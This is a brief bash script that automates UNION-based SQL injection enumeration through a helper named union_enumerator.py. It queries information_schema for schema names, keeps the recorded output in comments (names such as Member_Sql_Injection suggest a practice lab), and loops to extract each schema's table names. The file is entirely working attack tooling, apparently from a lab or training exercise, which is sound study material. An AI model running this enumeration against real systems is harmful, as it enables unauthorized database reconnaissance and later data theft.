#!/bin/bash

python union_enumerator.py "schema_name from information_schema.schemata"
# ----------------------------------------------------------------------------------------------------
# schema_name from information_schema.schemata
# information_schema
# Member_Brute_Force
# Member_Sql_Injection
# Member_guestbook
# Member_images
# Member_survey
# ----------------------------------------------------------------------------------------------------
names="Member_Brute_Force Member_Sql_Injection Member_guestbook Member_images Member_survey"
for name in $names; do
	python union_enumerator.py "table_name FROM information_schema.tables WHERE table_schema = " $name
done;
